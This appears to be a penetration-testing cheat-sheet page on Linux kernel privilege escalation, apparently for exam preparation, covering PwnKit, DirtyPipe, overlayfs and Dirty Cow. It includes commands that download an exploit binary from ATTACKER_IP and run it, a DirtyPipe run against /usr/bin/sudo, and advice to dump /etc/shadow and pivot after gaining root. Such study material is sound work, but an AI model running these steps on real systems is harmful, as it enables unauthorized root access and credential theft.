---
id: linux-kernel
title: Linux Kernel Exploits
stage: privesc
tags: [linux]
summary: Exploit unpatched kernel vulnerabilities for direct root — PwnKit (CVE-2021-4034) is the most reliable and works on nearly every Linux system built before January 2022.
leads_to:
  - root-linux
---

## Prerequisites

A local shell. The target kernel version must match a known CVE. Kernel exploits are last resort — try sudo, SUID, cron, and credential hunting first. A crash from a bad kernel exploit can kill the machine and cost you exam points.

Kernel exploits bypass all permission checks at the OS level, giving direct root access. PwnKit targets `pkexec` (a SUID binary), making it stable and crash-safe unlike pure kernel memory exploits. DirtyPipe writes to read-only files via a pipe race condition. Always identify the kernel version and distro before selecting an exploit.

## Quick Win

> Check the kernel version and try PwnKit first — most reliable, crash-safe, works almost everywhere.

```bash
uname -a
cat /etc/os-release
wget http://ATTACKER_IP:8000/PwnKit -O /tmp/pwn && chmod +x /tmp/pwn && /tmp/pwn
```

## Kernel Version Fingerprint

> Get the exact version for CVE matching — major.minor.patch matters.

```bash
uname -a
cat /etc/os-release
searchsploit "linux kernel $(uname -r)"
searchsploit linux 5.8 local privilege escalation
```

## Common Exploits

| CVE | Kernel Range | Notes |
|---|---|---|
| CVE-2021-4034 (PwnKit) | Most Linux < Jan 2022 | pkexec SUID — extremely reliable, no crash risk |
| CVE-2022-0847 (DirtyPipe) | 5.8 – 5.16 | Write to read-only files, works on RHEL 8/9 |
| CVE-2021-3493 (overlayfs) | Ubuntu-specific | Ubuntu 14–20 LTS |
| CVE-2016-5195 (Dirty Cow) | < 4.8.3 | Older systems only |

## PwnKit (CVE-2021-4034)

> Transfer pre-compiled binary and run — no compilation needed.

```bash
wget http://ATTACKER_IP:8000/PwnKit -O /tmp/pwn && chmod +x /tmp/pwn && /tmp/pwn
```

## DirtyPipe (CVE-2022-0847)

> Compile on target if gcc is available, or cross-compile and transfer.

```bash
# Compile on target
gcc -o /tmp/dpipe exploit.c && /tmp/dpipe /usr/bin/sudo
```

## Leads To

Kernel exploit fires → root shell → root-linux. PwnKit gives you a bash root shell directly. DirtyPipe allows overwriting the SUID bit on any binary or injecting into a root process. After root, dump `/etc/shadow` for password reuse and check network interfaces for additional segments to pivot into.
